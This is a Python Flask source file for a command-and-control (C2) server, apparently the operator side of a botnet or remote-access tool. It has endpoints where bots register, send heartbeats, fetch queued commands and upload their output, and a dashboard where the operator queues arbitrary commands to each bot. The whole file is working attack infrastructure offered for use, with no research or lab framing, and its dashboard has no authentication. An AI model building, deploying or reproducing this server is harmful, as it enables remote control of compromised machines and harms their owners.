import os
import json
import time
import threading
from datetime import datetime, timezone
from flask import Flask, render_template, request, jsonify, redirect, url_for

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
app = Flask(__name__, template_folder=os.path.join(BASE_DIR, 'templates'))

# Vercel: /tmp is writable; locally use data.json in project dir
DATA_DIR = os.environ.get("C2_DATA_DIR", BASE_DIR)
if DATA_DIR == "/tmp" or not os.access(DATA_DIR, os.W_OK):
    DATA_DIR = "/tmp"
DATA_FILE = os.path.join(DATA_DIR, "data.json")

lock = threading.Lock()

def load_data():
    if not os.path.exists(DATA_FILE):
        return {"bots": {}}
    with open(DATA_FILE, "r") as f:
        return json.load(f)

def save_data(data):
    os.makedirs(os.path.dirname(DATA_FILE), exist_ok=True)
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=2)

def get_bot(bot_id):
    data = load_data()
    return data["bots"].get(bot_id)

def upsert_bot(bot_id, update):
    data = load_data()
    if bot_id not in data["bots"]:
        data["bots"][bot_id] = {
            "id": bot_id,
            "first_seen": datetime.now(timezone.utc).isoformat(),
            "last_heartbeat": None,
            "last_seen": None,
            "ip": None,
            "commands": [],
            "outputs": []
        }
    data["bots"][bot_id].update(update)
    save_data(data)

def enrich_bot(bot):
    hb = bot.get("last_heartbeat")
    if hb:
        try:
            hb_dt = datetime.fromisoformat(hb)
            delta = (datetime.now(timezone.utc) - hb_dt).total_seconds()
            bot["online"] = delta < 60
        except:
            bot["online"] = False
    else:
        bot["online"] = False
    bot["cmd_count"] = len(bot.get("commands", []))
    bot["out_count"] = len(bot.get("outputs", []))
    return bot

# ─────────────── API endpoints for the bot ───────────────

@app.route("/register", methods=["POST"])
def register():
    body = request.get_json(force=True)
    bot_id = body.get("bot_id")
    if not bot_id:
        return jsonify({"error": "missing bot_id"}), 400

    with lock:
        upsert_bot(bot_id, {
            "last_seen": datetime.now(timezone.utc).isoformat(),
            "ip": request.remote_addr
        })

    print(f"[+] Bot registered: {bot_id}")
    return jsonify({"status": "ok", "bot_id": bot_id})


@app.route("/commands/<bot_id>", methods=["GET"])
def get_commands(bot_id):
    with lock:
        data = load_data()
        bot = data["bots"].get(bot_id)
        if not bot:
            return jsonify({"commands": []})

        pending = [c for c in bot.get("commands", []) if not c.get("sent")]
        for c in pending:
            c["sent"] = True

        bot["last_seen"] = datetime.now(timezone.utc).isoformat()
        save_data(data)

    return jsonify({"commands": [c["text"] for c in pending]})


@app.route("/output/<bot_id>", methods=["POST"])
def receive_output(bot_id):
    body = request.get_json(force=True)
    output_text = body.get("output", "")

    with lock:
        data = load_data()
        bot = data["bots"].get(bot_id)
        if bot:
            bot["outputs"].append({
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "text": output_text
            })
            bot["last_seen"] = datetime.now(timezone.utc).isoformat()
            save_data(data)

    print(f"[+] Output from {bot_id}: {output_text[:80]}...")
    return jsonify({"status": "ok"})


@app.route("/heartbeat/<bot_id>", methods=["POST"])
def heartbeat(bot_id):
    with lock:
        upsert_bot(bot_id, {
            "last_heartbeat": datetime.now(timezone.utc).isoformat(),
            "last_seen": datetime.now(timezone.utc).isoformat(),
            "ip": request.remote_addr
        })

    return jsonify({"status": "ok", "time": datetime.now(timezone.utc).isoformat()})

# ─────────────── Web UI endpoints ───────────────

@app.route("/")
def dashboard():
    data = load_data()
    bots = [enrich_bot(b) for b in data["bots"].values()]
    bots.sort(key=lambda b: b.get("last_seen") or "", reverse=True)
    return render_template("index.html", bots=bots, now=time.time())


@app.route("/bot/<bot_id>")
def bot_detail(bot_id):
    bot = get_bot(bot_id)
    if not bot:
        return render_template("index.html", bots=[], focused=bot_id, error="Bot not found", now=time.time())
    bot = enrich_bot(bot)
    return render_template("index.html", bots=[bot], focused=bot_id, now=time.time())


@app.route("/send_command", methods=["POST"])
def send_command():
    bot_id = request.form.get("bot_id")
    command = request.form.get("command")
    if not bot_id or not command:
        return jsonify({"error": "missing bot_id or command"}), 400

    with lock:
        data = load_data()
        if bot_id not in data["bots"]:
            return jsonify({"error": "bot not found"}), 404

        data["bots"][bot_id]["commands"].append({
            "text": command,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "sent": False
        })
        save_data(data)

    print(f"[+] Command sent to {bot_id}: {command}")
    return redirect(url_for("bot_detail", bot_id=bot_id))


@app.route("/clear/<bot_id>", methods=["POST"])
def clear_bot(bot_id):
    with lock:
        data = load_data()
        if bot_id in data["bots"]:
            data["bots"][bot_id]["commands"] = []
            data["bots"][bot_id]["outputs"] = []
            save_data(data)
    return redirect(url_for("bot_detail", bot_id=bot_id))


@app.route("/api/bots")
def api_bots():
    data = load_data()
    bots = [enrich_bot(b) for b in data["bots"].values()]
    return jsonify(bots)


@app.route("/api/bot/<bot_id>")
def api_bot(bot_id):
    bot = get_bot(bot_id)
    if not bot:
        return jsonify({"error": "not found"}), 404
    return jsonify(enrich_bot(bot))


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    debug = os.environ.get("VERCEL") != "1"
    print(f"[*] C2 Web Server running on http://0.0.0.0:{port}" + (" (debug)" if debug else ""))
    app.run(host="0.0.0.0", port=port, debug=debug)
